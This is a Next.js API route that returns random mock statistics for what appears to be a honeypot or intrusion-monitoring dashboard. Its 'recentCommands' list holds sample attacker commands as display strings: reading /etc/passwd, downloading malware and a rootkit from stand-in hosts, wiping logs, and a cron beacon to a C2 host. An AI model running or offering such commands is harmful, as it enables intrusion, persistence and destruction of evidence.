import { NextResponse } from "next/server"

export async function GET() {
  // Generate mock statistics
  const stats = {
    totalAttempts: Math.floor(Math.random() * 10000) + 500,
    uniqueIPs: Math.floor(Math.random() * 500) + 50,
    activeSessions: Math.floor(Math.random() * 15) + 1,
    topCountries: [
      { country: "China", count: Math.floor(Math.random() * 1000) + 200 },
      { country: "Russia", count: Math.floor(Math.random() * 800) + 150 },
      { country: "USA", count: Math.floor(Math.random() * 600) + 100 },
      { country: "Brazil", count: Math.floor(Math.random() * 400) + 50 },
      { country: "India", count: Math.floor(Math.random() * 300) + 30 },
    ],
    recentCommands: [
      "ls -la",
      "cat /etc/passwd",
      "wget http://malicious.example.com/malware.sh",
      "chmod +x exploit",
      "ps aux | grep ssh",
      "netstat -an",
      "curl -O http://malicious.example.com/rootkit",
      "./setup.sh",
      "rm -rf /var/log/*",
      "echo '* * * * * curl -s http://c2.example.com/beacon' >> /tmp/cron",
    ],
  }

  return NextResponse.json(stats)
}
